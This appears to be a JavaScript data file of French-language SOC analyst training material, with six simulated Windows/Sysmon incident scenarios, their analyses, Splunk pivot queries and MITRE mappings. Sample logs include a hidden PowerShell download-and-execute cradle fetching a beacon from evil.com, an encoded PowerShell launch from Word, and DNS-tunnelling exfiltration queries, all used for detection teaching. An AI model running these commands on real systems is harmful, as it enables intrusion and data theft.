const logsTrainingData = {

  method: {
    title: "La methode en 3 etapes",
    steps: [
      { num: "1", label: "LIRE", desc: "Identifier les champs cles : timestamp, source IP, dest IP, hostname, user, action, event code" },
      { num: "2", label: "DECRIRE", desc: "Resumer en UNE phrase ce qui se passe — clair, precis, factuel" },
      { num: "3", label: "PIVOTER", desc: "Dire quels champs tu investiguerais ensuite et pourquoi" }
    ]
  },

  eventCodes: [
    { code: "4624", meaning: "Logon reussi", detail: "Type 2=local, 3=reseau, 10=RDP" },
    { code: "4625", meaning: "Logon echoue", detail: "Brute force si en rafale" },
    { code: "4672", meaning: "Privileges speciaux assignes", detail: "Compte admin utilise" },
    { code: "4720", meaning: "Compte cree", detail: "Persistance possible" },
    { code: "4732", meaning: "User ajoute a un groupe", detail: "Escalade de privileges" },
    { code: "7045", meaning: "Service installe", detail: "Persistance / execution" },
    { code: "1102", meaning: "Journal efface", detail: "Anti-forensics" },
    { code: "Sysmon 1", meaning: "Process cree", detail: "Execution suspecte (Image, ParentImage, CommandLine)" },
    { code: "Sysmon 3", meaning: "Connexion reseau", detail: "C2 callback, exfiltration" },
    { code: "Sysmon 11", meaning: "Fichier cree", detail: "Malware droppe sur le disque" }
  ],

  scenarios: [
    {
      id: 1,
      title: "Brute Force RDP → Compromission",
      difficulty: "Facile",
      tags: ["Brute Force", "4625", "4624", "RDP"],
      logs: `Feb 25 08:12:01 SRC=DC01 EventCode=4625 Account_Name=j.martin Src_IP=185.220.101.34 Logon_Type=10 Status=0xC000006D
Feb 25 08:12:03 SRC=DC01 EventCode=4625 Account_Name=j.martin Src_IP=185.220.101.34 Logon_Type=10 Status=0xC000006D
Feb 25 08:12:04 SRC=DC01 EventCode=4625 Account_Name=j.martin Src_IP=185.220.101.34 Logon_Type=10 Status=0xC000006D
Feb 25 08:12:06 SRC=DC01 EventCode=4625 Account_Name=j.martin Src_IP=185.220.101.34 Logon_Type=10 Status=0xC000006D
Feb 25 08:12:08 SRC=DC01 EventCode=4624 Account_Name=j.martin Src_IP=185.220.101.34 Logon_Type=10`,
      analysis: "4 echecs d'authentification (4625) sur le compte j.martin depuis l'IP 185.220.101.34, suivis d'un succes (4624), le tout en 7 secondes. Le Logon_Type=10 indique du RDP. Le status 0xC000006D = mauvais mot de passe. C'est un brute force RDP reussi depuis une IP externe.",
      pivots: [
        { field: "IP source 185.220.101.34", query: "index=* src_ip=\"185.220.101.34\" | stats count by dest_ip, Account_Name", why: "Verifier si cette IP a cible d'autres comptes ou machines" },
        { field: "Compte j.martin", query: "index=security Account_Name=\"j.martin\" EventCode=4624 | table _time, src_ip, Logon_Type, hostname", why: "Voir toutes les connexions reussies de ce compte — d'ou et quand ?" },
        { field: "Hostname cible (DC01)", query: "index=sysmon hostname=\"DC01\" EventCode=1 | table _time, User, Image, ParentImage, CommandLine", why: "Qu'est-ce qui a ete execute sur cette machine apres le login ?" },
        { field: "Threat Intel", query: "Verifier 185.220.101.34 sur VirusTotal, AbuseIPDB, OTX", why: "Souvent un noeud Tor, un proxy anonyme, ou un VPS malveillant" }
      ],
      mitre: "T1110.001 - Brute Force: Password Guessing"
    },

    {
      id: 2,
      title: "Macro Office → PowerShell encode",
      difficulty: "Moyen",
      tags: ["Sysmon", "Macro", "PowerShell", "Download Cradle"],
      logs: `Feb 25 09:45:12 SRC=PC-MARTIN EventCode=1 (Process Create)
  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
  CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...
  User: DOMAIN\\j.martin
  Hostname: PC-MARTIN`,
      analysis: "Sysmon EventCode=1 : creation de processus. Word (WINWORD.EXE) a lance PowerShell avec les flags -nop (no profile), -w hidden (fenetre cachee) et -enc (commande encodee en base64). C'est la signature classique d'un document Office malveillant — une macro qui drop un payload. L'utilisateur est j.martin, qui a ete compromis via brute force juste avant.",
      pivots: [
        { field: "Decoder le base64", query: "echo 'SQBFAFgA...' | base64 -d  →  Revele la commande reelle (souvent IEX (New-Object Net.WebClient).DownloadString(...))", why: "Comprendre ce que le payload fait exactement" },
        { field: "ParentImage (WINWORD.EXE)", query: "index=sysmon hostname=\"PC-MARTIN\" ParentImage=*WINWORD* | table _time, Image, CommandLine", why: "Word a-t-il lance d'autres processus suspects ?" },
        { field: "Connexions reseau de PowerShell", query: "index=sysmon hostname=\"PC-MARTIN\" EventCode=3 Image=*powershell* | table _time, DestinationIp, DestinationPort", why: "Vers ou le PowerShell se connecte ? (C2 server)" },
        { field: "Logs email / proxy", query: "Chercher dans les logs email un mail avec PJ recu par j.martin juste avant 09:45", why: "Identifier le vecteur d'infection initial (phishing)" }
      ],
      mitre: "T1204.002 - User Execution: Malicious File + T1059.001 - PowerShell"
    },

    {
      id: 3,
      title: "Mouvement lateral → Persistance sur DC",
      difficulty: "Difficile",
      tags: ["Lateral Movement", "4624", "4672", "7045", "Service"],
      logs: `Feb 25 10:02:33 SRC=SRV-DC01 EventCode=4624 Account_Name=admin_srv Src_IP=10.10.5.42 Logon_Type=3
Feb 25 10:02:35 SRC=SRV-DC01 EventCode=4672 Account_Name=admin_srv
Feb 25 10:03:01 SRC=SRV-DC01 EventCode=7045 ServiceName=MSUpdate ImagePath=cmd.exe /c powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/beacon.ps1')"`,
      analysis: "Trois evenements critiques enchaines : (1) Logon reseau (4624 Type 3) avec le compte admin_srv sur le controleur de domaine SRV-DC01 depuis l'IP interne 10.10.5.42. (2) Le 4672 confirme que ce compte a des privileges d'admin. (3) Un 7045 : creation d'un nouveau service 'MSUpdate' dont le chemin d'execution est un PowerShell cache qui telecharge un beacon. C'est du mouvement lateral avec installation de persistance sur le DC — situation critique.",
      pivots: [
        { field: "IP source 10.10.5.42", query: "index=* src_ip=\"10.10.5.42\" | stats count by dest_ip, EventCode", why: "Identifier la machine source — probablement PC-MARTIN compromis precedemment" },
        { field: "Compte admin_srv", query: "index=security Account_Name=\"admin_srv\" EventCode=4624 | stats count by src_ip, Logon_Type | where src_ip!=\"serveurs_attendus\"", why: "Ce compte admin est-il utilise depuis des machines inhabituelles ?" },
        { field: "Service MSUpdate", query: "index=sysmon hostname=\"SRV-DC01\" EventCode=1 ParentImage=*cmd.exe* | table _time, Image, CommandLine", why: "Que fait le service une fois lance ? Quel processus cree-t-il ?" },
        { field: "Dump LSASS", query: "index=sysmon hostname=\"SRV-DC01\" EventCode=10 TargetImage=*lsass.exe* | table _time, SourceImage, GrantedAccess", why: "Verifier s'il y a eu vol de credentials sur le DC (critique: donne acces a tout le domaine)" },
        { field: "C2 callback", query: "index=proxy dest=\"evil.com\" OR index=dns query=*evil.com* | stats count by src_ip", why: "Quelles autres machines contactent ce serveur C2 ?" }
      ],
      mitre: "T1021.002 - Remote Services: SMB + T1543.003 - Create/Modify System Process: Windows Service"
    },

    {
      id: 4,
      title: "Exfiltration de donnees par DNS",
      difficulty: "Difficile",
      tags: ["DNS Tunneling", "Exfiltration", "Base64"],
      logs: `Feb 25 11:30:01 SRC=PC-MARTIN query=aGVsbG8gd29ybGQ.data.evil-domain.com type=A src_ip=10.10.5.42
Feb 25 11:30:02 SRC=PC-MARTIN query=dGhpcyBpcyBzZWNyZXQ.data.evil-domain.com type=A src_ip=10.10.5.42
Feb 25 11:30:03 SRC=PC-MARTIN query=cGFzc3dvcmQxMjM.data.evil-domain.com type=A src_ip=10.10.5.42
Feb 25 11:30:04 SRC=PC-MARTIN query=Y29uZmlkZW50aWFs.data.evil-domain.com type=A src_ip=10.10.5.42
[... 847 requetes similaires sur 15 minutes ...]`,
      analysis: "Des requetes DNS vers evil-domain.com avec des sous-domaines qui sont du base64 encode. En decodant : aGVsbG8gd29ybGQ = 'hello world', cGFzc3dvcmQxMjM = 'password123', Y29uZmlkZW50aWFs = 'confidentiel'. C'est de l'exfiltration de donnees par DNS tunneling : les donnees volees sont encodees et envoyees comme sous-domaines dans les requetes DNS, qui passent souvent les firewalls car le DNS est rarement filtre. Volume anormal : 847 requetes en 15 min vers le meme domaine.",
      pivots: [
        { field: "Volume DNS", query: "index=dns query=*evil-domain.com | stats count by src_ip | where count > 100", why: "Quantifier l'exfiltration et identifier toutes les machines touchees" },
        { field: "Decoder les sous-domaines", query: "Decoder le base64 de chaque sous-domaine pour reconstituer les donnees volees", why: "Evaluer la nature et la sensibilite des donnees exfiltrees" },
        { field: "WHOIS evil-domain.com", query: "whois evil-domain.com + verifier sur VirusTotal", why: "Identifier l'infrastructure de l'attaquant" },
        { field: "Process responsable", query: "index=sysmon hostname=\"PC-MARTIN\" EventCode=3 DestinationPort=53 | table _time, Image, DestinationIp", why: "Quel processus envoie ces requetes DNS ? (souvent le beacon C2)" }
      ],
      mitre: "T1048.003 - Exfiltration Over Alternative Protocol: DNS"
    },

    {
      id: 5,
      title: "Escalade de privileges — Compte admin cree",
      difficulty: "Moyen",
      tags: ["4720", "4732", "Privilege Escalation", "Persistence"],
      logs: `Feb 25 10:15:22 SRC=SRV-DC01 EventCode=4720 TargetUserName=svc_backup SubjectUserName=admin_srv
Feb 25 10:15:23 SRC=SRV-DC01 EventCode=4732 TargetUserName=svc_backup GroupName=Administrators SubjectUserName=admin_srv
Feb 25 10:15:24 SRC=SRV-DC01 EventCode=4732 TargetUserName=svc_backup GroupName=Domain Admins SubjectUserName=admin_srv`,
      analysis: "Le compte admin_srv (compromis precedemment) cree un nouveau compte 'svc_backup' (4720) puis l'ajoute immediatement au groupe local Administrators ET au groupe Domain Admins (deux 4732). Le nom 'svc_backup' est choisi pour paraitre legitime. Creer un compte Domain Admin = l'attaquant a maintenant un acces total et permanent au domaine. C'est de la persistance + escalade de privileges.",
      pivots: [
        { field: "Nouveau compte svc_backup", query: "index=security Account_Name=\"svc_backup\" | stats count by EventCode, src_ip", why: "Ou et comment ce compte est-il utilise apres sa creation ?" },
        { field: "Historique admin_srv", query: "index=security SubjectUserName=\"admin_srv\" EventCode IN (4720,4722,4732,4728) | table _time, EventCode, TargetUserName", why: "L'attaquant a-t-il cree d'autres comptes ou modifie d'autres groupes ?" },
        { field: "Connexions du nouveau compte", query: "index=security Account_Name=\"svc_backup\" EventCode=4624 | table _time, src_ip, Logon_Type, hostname", why: "Ce compte a-t-il deja ete utilise pour se connecter ?" },
        { field: "Baseline comptes admins", query: "Comparer avec la liste officielle des comptes Domain Admin — svc_backup ne devrait pas y etre", why: "Confirmer que c'est un compte illegitime" }
      ],
      mitre: "T1136.002 - Create Account: Domain Account + T1078.002 - Valid Accounts: Domain Accounts"
    },

    {
      id: 6,
      title: "Effacement de traces — Anti-forensics",
      difficulty: "Moyen",
      tags: ["1102", "Anti-Forensics", "Log Clearing"],
      logs: `Feb 25 12:00:01 SRC=SRV-DC01 EventCode=1102 SubjectUserName=svc_backup SubjectDomainName=DOMAIN
  Message: The audit log was cleared.
Feb 25 12:00:01 SRC=SRV-DC01 EventCode=104 SubjectUserName=svc_backup
  Log: System — The System log file was cleared.`,
      analysis: "Le compte svc_backup (cree par l'attaquant) efface les journaux d'evenements Windows : le 1102 indique que le journal Security a ete purge, le 104 indique que le journal System a ete purge. C'est de l'anti-forensics — l'attaquant tente d'effacer ses traces. IRONIE : l'action d'effacer les logs genere elle-meme un log (1102/104), et c'est souvent le seul evenement restant dans le journal.",
      pivots: [
        { field: "Derniers events avant effacement", query: "Si on a un SIEM centralise (Splunk!), les logs ont deja ete envoyes AVANT l'effacement local", why: "Les logs sont deja dans Splunk — l'attaquant a efface les copies locales mais pas le SIEM" },
        { field: "Compte svc_backup", query: "index=* Account_Name=\"svc_backup\" earliest=-24h | timeline", why: "Reconstituer toute la timeline de ce compte" },
        { field: "Autres machines", query: "index=security EventCode IN (1102,104) | stats count by hostname, SubjectUserName", why: "L'attaquant a-t-il efface les logs sur d'autres machines aussi ?" },
        { field: "Containment immediat", query: "DESACTIVER le compte svc_backup + admin_srv. Isoler SRV-DC01 et PC-MARTIN du reseau", why: "A ce stade, on est en reponse a incident — il faut contenir la menace" }
      ],
      mitre: "T1070.001 - Indicator Removal: Clear Windows Event Logs"
    }
  ],

  examTips: [
    "Toujours commencer par le TIMESTAMP — ca donne la timeline de l'attaque",
    "Nommer les EventCodes — dire '4625 c'est un echec de login' montre que tu connais",
    "Donner le Logon_Type — Type 3 = reseau, Type 10 = RDP, ca change tout",
    "Mentionner MITRE ATT&CK — 'ca correspond a T1110, Brute Force' impressionne",
    "Penser en CHAINE — un evenement seul est rarement suffisant, c'est la sequence qui raconte l'histoire",
    "Toujours proposer au moins 3 pivots concrets avec les requetes Splunk correspondantes",
    "Mentionner la Threat Intel externe (VirusTotal, AbuseIPDB) pour les IP/domaines/hash",
    "Conclure avec la severite et l'action recommandee (bloquer, isoler, escalader)"
  ]
};

if (typeof module !== 'undefined' && module.exports) {
  module.exports = { logsTrainingData };
}
